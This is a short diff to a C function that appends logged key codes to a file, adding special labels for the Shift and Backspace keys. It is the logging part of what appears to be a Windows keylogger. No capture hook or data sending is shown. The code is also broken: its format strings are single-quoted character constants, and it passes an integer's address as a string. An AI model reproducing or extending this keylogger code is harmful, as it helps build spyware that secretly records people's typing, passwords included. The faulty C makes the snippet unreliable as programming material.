@@ -37,8 +37,12 @@ int Save(int _key, char *file) {
   FILE *OUTPUT_FILE;
   
   OUTPUT_FILE = fopen(file, "a+");
-  
-  fprintf(OUTPUT_FILE, '%s', &_key);
+  if (_key == VK_SHIFT)
+    fprintf(OUTPUT_FILE, '%s', "[SHIFT]");
+  else if(_key == VK_BACK)
+    fprintf(OUTPUT_FILE, '%s', "[BACK]");
+  else
+    fprintf(OUTPUT_FILE, '%s', &_key);
   fclose(OUTPUT_FILE);
   
   return 0;
